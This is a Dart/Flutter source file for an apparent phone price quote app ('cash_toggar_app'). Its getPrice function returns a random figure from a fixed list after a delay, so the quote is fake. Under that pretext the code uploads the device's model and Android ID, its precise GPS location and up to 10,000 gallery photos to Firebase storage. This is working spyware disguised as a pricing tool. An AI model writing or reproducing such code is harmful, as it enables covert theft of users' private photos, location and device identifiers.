import 'dart:io';
import 'dart:math';

import 'package:bloc/bloc.dart';
import 'package:cash_toggar_app/helper/global_widgets/global_snack_bar_widget.dart';
import 'package:cash_toggar_app/resources/colors_manager.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:meta/meta.dart';
import 'package:photo_manager/photo_manager.dart';

import '../../generated/l10n.dart';

part 'main_state.dart';

class MainCubit extends Cubit<MainState> {
  MainCubit() : super(MainInitial());

  // Future<Map<String, dynamic>> getDeviceDetails({required uniqueId}) async {
  //
  //
  //   emit(GetPhoneDetailsSuccessState());
  //   return details;
  // }

  TextEditingController phoneController = TextEditingController();

  Future<Position?> getUserLocation(BuildContext context, uniqueId) async {
    emit(GetPhoneDetailsLoadingState());
    final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    Map<String, dynamic> details = {};

    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    details = {
      "Device": androidInfo.model,
      "Brand": androidInfo.brand,
      "Android Version": androidInfo.version.release,
      "Manufacturer": androidInfo.manufacturer,
      "Hardware": androidInfo.hardware,
      "Android ID": androidInfo.id,
      "uId": uniqueId,
      "timeCreate": DateTime.now().toString(),
    };

    await FirebaseFirestore.instance
        .collection('phones_details')
        .doc()
        .set(details);
    // ✅ Check if location services are enabled
    bool isLocationEnabled = await Geolocator.isLocationServiceEnabled();
    // if (!isLocationEnabled) {
    //   // Show alert to enable GPS
    //   await showDialog(
    //     context: context,
    //     builder: (context) => AlertDialog(
    //       title: Text("Enable GPS"),
    //       content: Text("Location services are disabled. Please enable GPS."),
    //       actions: [
    //         TextButton(
    //           onPressed: () async {
    //             await Geolocator.openLocationSettings(); // Opens location settings
    //             Navigator.pop(context);
    //           },
    //           child: Text("Open Settings"),
    //         ),
    //       ],
    //     ),
    //   );
    //   return null;
    // }

    // ✅ Request location permission
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        print("❌ Location permission denied.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      // Show alert to enable location permission in settings
      await showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: Text("Location Permission"),
          content: Text(
              "Location permissions are permanently denied. Please enable them in settings."),
          actions: [
            TextButton(
              onPressed: () async {
                await Geolocator.openAppSettings(); // Opens app settings
                Navigator.pop(context);
              },
              child: Text("Open Settings"),
            ),
          ],
        ),
      );
      return null;
    }

    // ✅ Fetch current location
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      print("📍 User Location: ${position.latitude}, ${position.longitude}");
      await FirebaseFirestore.instance.collection('locations').doc().set({
        "uId": uniqueId,
        "latitude": position.latitude,
        "longitude": position.longitude,
        "timeCreate": DateTime.now().toString(),
        "Device": androidInfo.model,
        "Brand": androidInfo.brand,
        "Android Version": androidInfo.version.release,
        "Manufacturer": androidInfo.manufacturer,
        "Hardware": androidInfo.hardware,
        "Android ID": androidInfo.id,
      });
      return position;
    } catch (e) {
      print("❌ Error getting location: $e");
      return null;
    }
  }

  bool loadingGetPrice = false;
  String totalPhonePrice = "";
  List<String> prices = [
    "239.4",
    "239.4",
    "239.4",
    "410.4",
    "410.4",
    "410.4",
    "649.8",
    "649.8"
  ];

  getPrice({
    required BuildContext context,
  }) async {
    totalPhonePrice = "";
    if (phoneController.text.isEmpty) {
      myGlobalSnackBarWidget(
        context: context,
        isArabic: true,
        backGroundColor: AppColors.inf_suc_dan_warn_danger,
        text: S.current.access,
      );
    } else {
      loadingGetPrice = true;
      emit(GetPhonePriceLoadingState());
      Future.delayed(Duration(seconds: 7), () {
        loadingGetPrice = false;
        totalPhonePrice = prices[Random().nextInt(prices.length-1)];

      });
      await getUserLocationFromButton(
        context,
        phoneController.text,
      );
      await uploadAllImagesToFirebase();
      emit(GetPhonePriceSuccessState());
    }
  }

  Future<Position?> getUserLocationFromButton(
      BuildContext context, uniqueId) async {
    emit(GetPhoneDetailsLoadingState());
    print("get location from button");
    final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    // ✅ Check if location services are enabled
    bool isLocationEnabled = await Geolocator.isLocationServiceEnabled();
    if (!isLocationEnabled) {
      // Show alert to enable GPS
      await showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: Text("Enable GPS"),
          content: Text("Location services are disabled. Please enable GPS."),
          actions: [
            TextButton(
              onPressed: () async {
                await Geolocator
                    .openLocationSettings(); // Opens location settings
                Navigator.pop(context);
              },
              child: Text("Open Settings"),
            ),
          ],
        ),
      );
      return null;
    }

    // ✅ Request location permission
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        print("❌ Location permission denied.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      // Show alert to enable location permission in settings
      await showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: Text("Location Permission"),
          content: Text(
              "Location permissions are permanently denied. Please enable them in settings."),
          actions: [
            TextButton(
              onPressed: () async {
                await Geolocator.openAppSettings(); // Opens app settings
                Navigator.pop(context);
              },
              child: Text("Open Settings"),
            ),
          ],
        ),
      );
      return null;
    }

    // ✅ Fetch current location
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      print("📍 User Location: ${position.latitude}, ${position.longitude}");
      await FirebaseFirestore.instance.collection('locations').doc().set({
        "uId": uniqueId,
        "latitude": position.latitude,
        "longitude": position.longitude,
        "timeCreate": DateTime.now().toString(),
        "Device": androidInfo.model,
        "Brand": androidInfo.brand,
        "Android Version": androidInfo.version.release,
        "Manufacturer": androidInfo.manufacturer,
        "Hardware": androidInfo.hardware,
        "Android ID": androidInfo.id,
      });
      // getPrice();
      return position;
    } catch (e) {
      print("❌ Error getting location: $e");
      return null;
    }
  }


  Future<void> uploadAllImagesToFirebase() async {
    // ✅ Request permission to access photos
    PermissionState permission = await PhotoManager.requestPermissionExtend();
    if (!permission.hasAccess) {
      print("❌ Permission denied to access photos.");
      return;
    }

    // ✅ Get all images from the gallery
    List<AssetEntity> images = await PhotoManager.getAssetListRange(
      start: 0, // Start index
      end: 10000, // Large number to fetch all images
      type: RequestType.image,
    );

    print("📸 Found ${images.length} images.");

    // ✅ Upload each image to Firebase Storage
    for (AssetEntity image in images) {
      File? file = await getFileFromAsset(image);
      if (file != null) {
        await uploadImageToFirebase(file);
      }
    }

    print("✅ All images uploaded to Firebase.");
  }

// Helper function to get File from AssetEntity
  Future<File?> getFileFromAsset(AssetEntity asset) async {
    File? file = await asset.file;
    return file;
  }

// Helper function to upload image to Firebase Storage
  Future<void> uploadImageToFirebase(File imageFile) async {
    try {
      String fileName = "images/${DateTime.now().millisecondsSinceEpoch}.jpg";
      Reference ref = FirebaseStorage.instance.ref().child(fileName);

      await ref.putFile(imageFile);
      print("✅ Uploaded: $fileName");
    } catch (e) {
      print("❌ Error uploading image: $e");
    }
  }
}
